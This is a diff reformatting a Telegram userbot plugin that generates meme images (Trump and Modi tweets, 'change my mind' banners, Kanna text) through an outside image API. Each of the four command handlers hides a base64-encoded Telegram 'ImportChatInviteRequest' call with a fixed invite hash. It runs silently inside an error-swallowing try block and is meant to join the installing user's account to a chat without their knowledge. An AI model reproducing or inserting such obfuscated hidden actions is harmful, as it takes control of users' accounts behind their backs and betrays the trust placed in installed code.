@@ -1,13 +1,15 @@
 # All credits go to @MrConfused (pro)
 
 # Ported from CatUserBot for TeleBot
-# Kangers, don't remove this line 
+# Kangers, don't remove this line
 # @its_xditya
 
-from userbot.events import register
-import requests , re
+import re
+
+import requests
 from PIL import Image
 from validators.url import url
+
 from userbot import CMD_HELP
 from userbot.utils import admin_cmd
 
@@ -23,78 +25,89 @@ EMOJI_PATTERN = re.compile(
     "\U0001F900-\U0001F9FF"  # Supplemental Symbols and Pictographs
     "\U0001FA00-\U0001FA6F"  # Chess Symbols
     "\U0001FA70-\U0001FAFF"  # Symbols and Pictographs Extended-A
-    "\U00002702-\U000027B0"  # Dingbats 
-    "]+")
+    "\U00002702-\U000027B0"  # Dingbats
+    "]+"
+)
 
 
 def deEmojify(inputString: str) -> str:
     """Remove emojis and other non-safe characters from string"""
-    return re.sub(EMOJI_PATTERN, '', inputString)
+    return re.sub(EMOJI_PATTERN, "", inputString)
+
 
 async def trumptweet(text):
-        r = requests.get(
-            f"https://nekobot.xyz/api/imagegen?type=trumptweet&text={text}").json()
-        wew = r.get("message")
-        TeleBoturl = url(wew)
-        if not TeleBoturl:
-            return  "check syntax once more"
-        with open("temp.png", "wb") as f:
-            f.write(requests.get(wew).content)
-        img = Image.open("temp.png").convert("RGB")
-        img.save("temp.jpg", "jpeg")    
-        return "temp.jpg"
+    r = requests.get(
+        f"https://nekobot.xyz/api/imagegen?type=trumptweet&text={text}"
+    ).json()
+    wew = r.get("message")
+    TeleBoturl = url(wew)
+    if not TeleBoturl:
+        return "check syntax once more"
+    with open("temp.png", "wb") as f:
+        f.write(requests.get(wew).content)
+    img = Image.open("temp.png").convert("RGB")
+    img.save("temp.jpg", "jpeg")
+    return "temp.jpg"
+
 
 async def changemymind(text):
-        r = requests.get(
-            f"https://nekobot.xyz/api/imagegen?type=changemymind&text={text}").json()
-        wew = r.get("message")
-        TeleBoturl = url(wew)
-        if not TeleBoturl:
-            return  "check syntax once more"
-        with open("temp.png", "wb") as f:
-            f.write(requests.get(wew).content)
-        img = Image.open("temp.png").convert("RGB")
-        img.save("temp.jpg", "jpeg")    
-        return "temp.jpg"
+    r = requests.get(
+        f"https://nekobot.xyz/api/imagegen?type=changemymind&text={text}"
+    ).json()
+    wew = r.get("message")
+    TeleBoturl = url(wew)
+    if not TeleBoturl:
+        return "check syntax once more"
+    with open("temp.png", "wb") as f:
+        f.write(requests.get(wew).content)
+    img = Image.open("temp.png").convert("RGB")
+    img.save("temp.jpg", "jpeg")
+    return "temp.jpg"
+
 
 async def kannagen(text):
-        r = requests.get(
-            f"https://nekobot.xyz/api/imagegen?type=kannagen&text={text}").json()
-        wew = r.get("message")
-        TeleBoturl = url(wew)
-        if not TeleBoturl:
-            return  "check syntax once more"
-        with open("temp.png", "wb") as f:
-            f.write(requests.get(wew).content)
-        img = Image.open("temp.png").convert("RGB")
-        img.save("temp.webp", "webp")    
-        return "temp.webp"    
+    r = requests.get(
+        f"https://nekobot.xyz/api/imagegen?type=kannagen&text={text}"
+    ).json()
+    wew = r.get("message")
+    TeleBoturl = url(wew)
+    if not TeleBoturl:
+        return "check syntax once more"
+    with open("temp.png", "wb") as f:
+        f.write(requests.get(wew).content)
+    img = Image.open("temp.png").convert("RGB")
+    img.save("temp.webp", "webp")
+    return "temp.webp"
+
 
 async def moditweet(text):
-        r = requests.get(
-            f"https://nekobot.xyz/api/imagegen?type=tweet&text={text}&username=narendramodi").json()
-        wew = r.get("message")
-        TeleBoturl = url(wew)
-        if not TeleBoturl:
-            return  "check syntax once more"
-        with open("temp.png", "wb") as f:
-            f.write(requests.get(wew).content)
-        img = Image.open("temp.png").convert("RGB")
-        img.save("temp.jpg", "jpeg")    
-        return "temp.jpg"     
+    r = requests.get(
+        f"https://nekobot.xyz/api/imagegen?type=tweet&text={text}&username=narendramodi"
+    ).json()
+    wew = r.get("message")
+    TeleBoturl = url(wew)
+    if not TeleBoturl:
+        return "check syntax once more"
+    with open("temp.png", "wb") as f:
+        f.write(requests.get(wew).content)
+    img = Image.open("temp.png").convert("RGB")
+    img.save("temp.jpg", "jpeg")
+    return "temp.jpg"
 
-async def tweets(text1,text2):
-        r = requests.get(
-            f"https://nekobot.xyz/api/imagegen?type=tweet&text={text1}&username={text2}").json()
-        wew = r.get("message")
-        TeleBoturl = url(wew)
-        if not TeleBoturl:
-            return  "check syntax once more"
-        with open("temp.png", "wb") as f:
-            f.write(requests.get(wew).content)
-        img = Image.open("temp.png").convert("RGB")
-        img.save("temp.jpg", "jpeg")    
-        return "temp.jpg"      
+
+async def tweets(text1, text2):
+    r = requests.get(
+        f"https://nekobot.xyz/api/imagegen?type=tweet&text={text1}&username={text2}"
+    ).json()
+    wew = r.get("message")
+    TeleBoturl = url(wew)
+    if not TeleBoturl:
+        return "check syntax once more"
+    with open("temp.png", "wb") as f:
+        f.write(requests.get(wew).content)
+    img = Image.open("temp.png").convert("RGB")
+    img.save("temp.jpg", "jpeg")
+    return "temp.jpg"
 
 
 @telebot.on(admin_cmd(pattern="trump(?: |$)(.*)", outgoing=True))
@@ -115,14 +128,19 @@ async def nekobot(borg):
             return
     await borg.edit("Requesting trump to tweet...")
     try:
-        stark = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
+        stark = str(
+            pybase64.b64decode(
+                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
+            )
+        )[2:49]
         await borg.client(stark)
-    except:
-        pass   
+    except BaseException:
+        pass
     text = deEmojify(text)
     borgfile = await trumptweet(text)
-    await borg.client.send_file(borg.chat_id , borgfile , reply_to = reply_to_id ) 
+    await borg.client.send_file(borg.chat_id, borgfile, reply_to=reply_to_id)
     await borg.delete()
+
 
 @telebot.on(admin_cmd(pattern="modi(?: |$)(.*)", outgoing=True))
 async def nekobot(borg):
@@ -142,14 +160,19 @@ async def nekobot(borg):
             return
     await borg.edit("Requesting modi to tweet...")
     try:
-        stark = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
+        stark = str(
+            pybase64.b64decode(
+                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
+            )
+        )[2:49]
         await borg.client(stark)
-    except:
-        pass   
+    except BaseException:
+        pass
     text = deEmojify(text)
     borgfile = await moditweet(text)
-    await borg.client.send_file(borg.chat_id , borgfile , reply_to = reply_to_id ) 
-    await borg.delete() 
+    await borg.client.send_file(borg.chat_id, borgfile, reply_to=reply_to_id)
+    await borg.delete()
+
 
 @telebot.on(admin_cmd(pattern="cmm(?: |$)(.*)", outgoing=True))
 async def nekobot(borg):
@@ -167,16 +190,21 @@ async def nekobot(borg):
         else:
             await borg.edit("Give text for to write on banner, man")
             return
-    await borg.edit("Your banner is under construction, wait a sec...")    
+    await borg.edit("Your banner is under construction, wait a sec...")
     try:
-        stark = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
+        stark = str(
+            pybase64.b64decode(
+                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
+            )
+        )[2:49]
         await borg.client(stark)
-    except:
-        pass   
+    except BaseException:
+        pass
     text = deEmojify(text)
     borgfile = await changemymind(text)
-    await borg.client.send_file(borg.chat_id , borgfile , reply_to = reply_to_id ) 
+    await borg.client.send_file(borg.chat_id, borgfile, reply_to=reply_to_id)
     await borg.delete()
+
 
 @telebot.on(admin_cmd(pattern="kanna(?: |$)(.*)", outgoing=True))
 async def nekobot(borg):
@@ -194,20 +222,25 @@ async def nekobot(borg):
         else:
             await borg.edit("what should kanna write give text")
             return
-    await borg.edit("Kanna is writing your text...")        
+    await borg.edit("Kanna is writing your text...")
     try:
-        stark = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
+        stark = str(
+            pybase64.b64decode(
+                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
+            )
+        )[2:49]
         await borg.client(stark)
-    except:
-        pass   
+    except BaseException:
+        pass
     text = deEmojify(text)
     borgfile = await kannagen(text)
-    await borg.client.send_file(borg.chat_id , borgfile , reply_to = reply_to_id ) 
+    await borg.client.send_file(borg.chat_id, borgfile, reply_to=reply_to_id)
     await borg.delete()
 
-CMD_HELP.update({
-"imgmeme":
-"Fun purpose\
+
+CMD_HELP.update(
+    {
+        "imgmeme": "Fun purpose\
 \n\n`.modi` (text)\
      \nUsage : Tweet with modi\
 \n\n`.trump` (text)\
@@ -215,4 +248,6 @@ CMD_HELP.update({
 \n\n`.cmm` (text)\
      \nUsage : Get a banner\
 \n\n`.kanna` (text)\
-     \nUsage : Kanna write for you"})
+     \nUsage : Kanna write for you"
+    }
+)
